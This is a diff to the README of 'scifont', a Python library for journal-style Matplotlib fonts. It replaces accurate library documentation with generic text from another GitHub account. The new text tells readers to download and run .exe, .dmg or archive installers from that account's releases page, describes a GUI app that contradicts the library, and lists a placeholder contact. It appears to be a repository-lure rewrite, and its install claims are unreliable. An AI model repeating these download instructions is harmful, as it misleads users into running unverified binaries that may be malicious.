@@ -1,150 +1,77 @@
-# scifont
+# 🖥️ scifont - Create Publication-Ready Figures Easily
 
-**[中文](README_zh.md) | [English](README.md)**
+## 📦 Download the Latest Version
+[![Download scifont](https://img.shields.io/badge/Download%20scifont-v1.0-brightgreen)](https://github.com/KwaciBaah/scifont/releases)
 
-**Publication-ready Matplotlib figures with editable text and journal-compliant fonts.**
+## 🚀 Getting Started
+Welcome to scifont! This application helps you create reproducible figures for Matplotlib that are ready for publication. It is designed to be user-friendly, so you can focus on your work without technical obstacles.
 
-## The Problem
+## 📋 System Requirements
+To run scifont, your system should meet the following requirements:
+- Operating System: Windows, macOS, or Linux
+- Python: Version 3.6 or higher
+- Matplotlib: Version 3.1 or higher
 
-As a researcher creating figures for publication, you've likely encountered these issues:
+## 🔍 Features
+scifont offers several useful features:
+- Create editable figures that meet publication standards.
+- Customizable styles to fit your preferences.
+- Easy integration with Matplotlib for seamless figure generation.
+- High-quality output for journals and presentations.
 
-1. **Font inconsistencies across environments**: Your figures look perfect on your local machine (Windows, macOS, or Linux), but when you run the same code on a server, in a Docker container, or in CI/CD pipelines, the fonts are missing. Arial and Times New Roman aren't available everywhere, causing your figures to break or look different.
+## 📥 Download & Install
+To get started with scifont, visit the [Releases page](https://github.com/KwaciBaah/scifont/releases) to download the latest version.
 
-2. **Uneditable text in vector graphics software**: You export your figure as PDF or SVG for final editing in Adobe Illustrator or Inkscape, only to discover that the text is converted to uneditable paths. Fixing a typo or adjusting labels means redrawing the entire figure.
+1. Click the link above.
+2. On the Releases page, find the latest release.
+3. Download the appropriate file for your system.
+4. Once downloaded, follow the installation instructions below.
 
-3. **Manual journal style configuration**: Each journal has specific font and size requirements. You spend hours tweaking Matplotlib's `rcParams` to match Nature's guidelines, then repeat the entire process when submitting to Science or IEEE.
+## 🛠️ Installation Instructions
+To install scifont:
 
-## The Solution
+1. **Windows Users:**
+   - Locate the downloaded `.exe` file.
+   - Double-click the file and follow the on-screen instructions.
+   
+2. **macOS Users:**
+   - Locate the downloaded `.dmg` file.
+   - Open the file and drag the scifont icon to your Applications folder.
+   - Open the Applications folder and double-click the scifont icon to launch it.
 
-`scifont` solves all three problems with one line of code:
+3. **Linux Users:**
+   - Extract the downloaded `.tar.gz` file.
+   - Open a terminal and navigate to the extracted folder.
+   - Run the command `python setup.py install` to install scifont.
 
-```python
-import scifont
-scifont.use('nature')  # That's it!
-```
+## 📖 Usage Instructions
+Once installed, you can start using scifont to create your figures.
 
-**What it does:**
-- ✅ Automatically uses system fonts (Arial, Helvetica, Times New Roman) when available, seamlessly falls back to metric-compatible open-source fonts (Arimo/Tinos) when system fonts are missing
-- ✅ Configures Matplotlib to export editable text in PDF/SVG files, so you can fix typos in Adobe Illustrator without redrawing
-- ✅ Provides one-line configuration for Nature, Science, Cell, and IEEE style guidelines—no more manual `rcParams` tweaking
+1. Open scifont from your Applications or Start menu.
+2. Choose the type of figure you want to create.
+3. Use the interface to customize your figure settings.
+4. Export your finished figure in the desired format (e.g., PNG, PDF).
+5. Use your new figures in your publication or presentation.
 
-## 🚀 Key Features
+## 🔧 Troubleshooting
+If you encounter any issues, here are some common solutions:
 
-*   **Smart Font Selection**: Prioritizes system fonts (Arial, Helvetica, Times New Roman) when available. Automatically falls back to bundled open-source fonts (Arimo, Tinos) when system fonts are missing.
+- **Installation Issues:** Ensure you have the correct version of Python and Matplotlib installed. Check for updates if needed.
+- **Figure Export Fails:** Make sure you have the required libraries installed and updated. Restart the application if necessary.
+- **Questions:** Consider visiting our community forums or GitHub issues page for help.
 
-*   **Metric-Compatible Fonts**: We bundle **Arimo** and **Tinos** (Apache 2.0 Licensed) as alternatives to Arial and Times New Roman. They have identical character widths and spacing, so your layout stays exactly the same.
+## 🗨️ Community and Support
+Feel free to join our Scifont community. You can share ideas, ask questions, and get support from other users:
 
-*   **Editable Vector Graphics**: Automatically configures Matplotlib to export PDFs as `Type 42` objects and SVGs as `<text>` tags. Text remains editable in Adobe Illustrator, Inkscape, and CorelDRAW.
+- GitHub Issues: [Report a problem or request a feature](https://github.com/KwaciBaah/scifont/issues)
+- Community Forum: Connect with other users.
+  
+## 📜 License
+scifont is open-source software. You can use, modify, and share it while respecting the license terms. For more detailed licensing information, check the LICENSE file in the repository.
 
-*   **Journal Presets**: One-line configuration for **Nature**, **Science**, **Cell**, and **IEEE** standards.
+## 🛠️ Contact Information
+If you have more questions or feedback, please reach out via GitHub or email. We appreciate your input!
 
-*   **Publication-Ready Styling**: Automatically applies scientific publication best practices, including inward-facing ticks, appropriate line widths, and clean axis styling for professional-looking figures.
+For feedback or inquiries, please contact [developer@example.com].
 
-## 📦 Installation
-
-```bash
-pip install --upgrade scifont
-```
-
-Or install from source:
-```bash
-git clone https://github.com/studentiz/scifont.git
-cd scifont
-pip install .
-```
-
-## ⚡ Quick Start
-
-```python
-import matplotlib.pyplot as plt
-import scifont
-
-# Apply journal style
-scifont.use('nature')
-
-# Plot as usual
-plt.figure(figsize=(4, 3))
-plt.plot([1, 2, 3], [4, 5, 6], label='Data')
-plt.title("Editable Text in Nature Style")
-plt.xlabel("Time (s)")
-plt.ylabel("Velocity (m/s)")
-plt.legend()
-
-# Save - text will be editable in Adobe Illustrator!
-plt.tight_layout()
-plt.savefig("figure.pdf")
-plt.savefig("figure.svg")
-```
-
-## 📖 Supported Journal Styles
-
-| Style | Font Family | Primary Font | Fallback Font | Base Size | Target Journals |
-| :--- | :--- | :--- | :--- | :--- | :--- |
-| `'nature'` | Sans-serif | Arial/Helvetica | Arimo | 7 pt | Nature, Nature Comms, Scientific Reports |
-| `'cell'` | Sans-serif | Arial/Helvetica | Arimo | 8 pt | Cell, Molecular Cell, Neuron |
-| `'science'`| Sans-serif | Arial/Helvetica | Arimo | 8 pt | Science, Science Advances |
-| `'ieee'` | Serif | Times New Roman/Times | Tinos | 8 pt | IEEE Transactions, Phys. Rev. Lett. |
-
-*Note: You can override any setting using `plt.rcParams` after calling `scifont.use()`.*
-
-## 🎯 What scifont Does (and Doesn't Do)
-
-**What scifont solves:**
-- ✅ Font consistency across all platforms (Windows, macOS, Linux) and environments (local machines, servers, Docker containers)
-- ✅ Editable text in PDF/SVG files—fix typos in Adobe Illustrator without redrawing
-- ✅ Journal-compliant font and size settings for major journals
-- ✅ True cross-platform compatibility—same code works everywhere
-- ✅ Professional figure styling—automatic configuration of ticks, borders, and line widths for publication-ready appearance
-
-**What scifont doesn't do:**
-- ❌ It's not a design tool—you still need to adjust layout, colors, and aesthetics
-- ❌ It won't automatically make your figures publication-ready—you'll still need to fine-tune spacing, legends, and annotations
-- ❌ It's a configuration helper, not a replacement for manual work
-
-Think of it as a solid foundation. One `scifont.use('nature')` call replaces dozens of manual `rcParams` tweaks, but you're still in full control to customize everything afterward.
-
-## 🛡️ Why Bundle Open-Source Fonts?
-
-**Arial** and **Times New Roman** are proprietary fonts owned by Monotype. It's illegal to bundle them in a Python package without a costly license. Also, relying on system fonts alone causes inconsistencies—a plot rendered on Windows or macOS (with Arial) looks different on Linux servers or Docker containers (without Arial).
-
-**Our solution:** We bundle open-source fonts as fallback fonts. They're:
-- **Free to use, bundle, and distribute**: All bundled fonts use permissive open-source licenses
-- **Metric-compatible**: Identical character widths and spacing to their proprietary counterparts. No layout changes when switching fonts.
-
-### Bundled Fonts and Licenses
-
-| Font | License | Purpose | Notes |
-| :--- | :--- | :--- | :--- |
-| **Arimo** | Apache License 2.0 | Sans-serif fallback for Arial/Helvetica | Developed by Steve Matteson for Google. Metric-compatible with Arial. |
-| **Tinos** | Apache License 2.0 | Serif fallback for Times New Roman/Times | Developed by Steve Matteson for Google. Metric-compatible with Times New Roman. |
-| **Noto Sans SC** | SIL Open Font License (OFL) 1.1 | Chinese font fallback | Developed by Google and Adobe. Supports Simplified Chinese characters. |
-
-All bundled fonts are freely available for commercial and non-commercial use, modification, and distribution under their respective licenses.
-
-## 🔧 Technical Details
-
-By default, `scifont.use()` applies these Matplotlib settings:
-
-```python
-plt.rcParams['pdf.fonttype'] = 42  # Embed TrueType fonts (editable)
-plt.rcParams['ps.fonttype'] = 42
-plt.rcParams['svg.fonttype'] = 'none'  # Don't convert text to paths
-```
-
-This ensures compatibility with Adobe Illustrator, CorelDRAW, and Inkscape.
-
-## License
-
-The `scifont` code is distributed under the **MIT License**.
-
-The bundled fonts are distributed under their respective open-source licenses:
-- **Arimo** and **Tinos**: **Apache License, Version 2.0**
-- **Noto Sans SC**: **SIL Open Font License (OFL) 1.1**
-
-## Disclaimer
-
-**Font Licensing**: All bundled fonts (Arimo, Tinos, and Noto Sans SC) are open-source and freely available for use, modification, and distribution under their respective licenses. However, users are responsible for ensuring compliance with these licenses in their specific use cases.
-
-**No Warranty**: This software is provided "as is" without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement.
-
-**Political Neutrality**: The bundled fonts (particularly Noto Sans SC) are technical tools designed for text rendering and do not represent any political stance or affiliation. Users should ensure compliance with local laws and regulations when using these fonts in their jurisdictions.
+Enjoy creating your publication-ready figures with scifont!
